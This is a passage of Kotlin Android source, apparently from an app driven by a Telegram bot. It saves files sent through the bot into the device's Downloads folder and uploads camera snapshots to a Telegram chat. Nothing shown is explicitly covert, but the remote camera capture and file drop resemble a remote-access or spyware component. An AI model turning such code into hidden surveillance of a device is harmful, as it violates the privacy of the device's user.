                val downloadUrl = "$BASE_FILE_URL/$filePath"
                val request     = Request.Builder().url(downloadUrl).get().build()
                val bytes = httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        sendMessage(chatId, "❌ Download failed: ${response.code}")
                        return@launch
                    }
                    response.body?.bytes() ?: run {
                        sendMessage(chatId, "❌ Empty response from Telegram.")
                        return@launch
                    }
                }

                val mime = MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(fileName.substringAfterLast('.', ""))
                    ?: "application/octet-stream"

                val saved = saveToDownloads(fileName, mime, bytes)
                if (saved) {
                    sendMessage(chatId, "✅ *$fileName* saved to Downloads folder.", parseMode = "Markdown")
                } else {
                    sendMessage(chatId, "❌ Failed to write file to storage.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleIncomingDocument exception: ${e.message}")
                sendMessage(chatId, "❌ Error saving file: ${e.message}")
            }
        }
    }

    private fun getTelegramFilePath(fileId: String): String? {
        return try {
            val request  = Request.Builder().url("$URL_GET_FILE?file_id=$fileId").get().build()
            val body     = httpClient.newCall(request).execute().use { it.body?.string() } ?: return null
            val json     = JSONObject(body)
            if (!json.optBoolean("ok", false)) return null
            json.optJSONObject("result")?.optString("file_path")
        } catch (e: Exception) {
            Log.e(TAG, "getTelegramFilePath failed: ${e.message}")
            null
        }
    }

    private fun saveToDownloads(fileName: String, mimeType: String, bytes: ByteArray): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
                    put(MediaStore.Downloads.MIME_TYPE,    mimeType)
                    put(MediaStore.Downloads.IS_PENDING,   1)
                }
                val collection = MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY)
                val uri = contentResolver.insert(collection, values) ?: return false

                contentResolver.openOutputStream(uri)?.use { it.write(bytes) }

                values.clear()
                values.put(MediaStore.Downloads.IS_PENDING, 0)
                contentResolver.update(uri, values, null, null)
            } else {
                val dir  = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                dir.mkdirs()
                val file = File(dir, fileName)
                file.writeBytes(bytes)
            }
            true
        } catch (e: Exception) {
            Log.e(TAG, "saveToDownloads failed: ${e.message}")
            false
        }
    }

    private fun sendMessage(chatId: String, text: String, parseMode: String? = null) {
        try {
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
                if (parseMode != null) put("parse_mode", parseMode)
            }

            val body = json.toString()
                .toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(URL_SEND_MSG)
                .post(body)
                .build()

            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendMessage failed: ${response.code} ${response.body?.string()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendMessage exception: ${e.message}")
        }
    }

    private fun sendPhoto(chatId: String, photoFile: File) {
        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", "📸 Camera snapshot – ${
                    SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
                }")
                .addFormDataPart(
                    "photo",
                    photoFile.name,
                    photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
                )
                .build()

            val request = Request.Builder()
                .url(URL_SEND_PHOTO)
                .post(requestBody)
                .build()

            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.i(TAG, "Photo sent successfully")
                } else {
                    val err = response.body?.string()
                    Log.w(TAG, "sendPhoto failed: ${response.code} $err")
                    sendMessage(chatId, "❌ Photo upload failed: $err")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendPhoto exception: ${e.message}")
            sendMessage(chatId, "❌ Photo upload exception: ${e.message}")
        }
    }
}
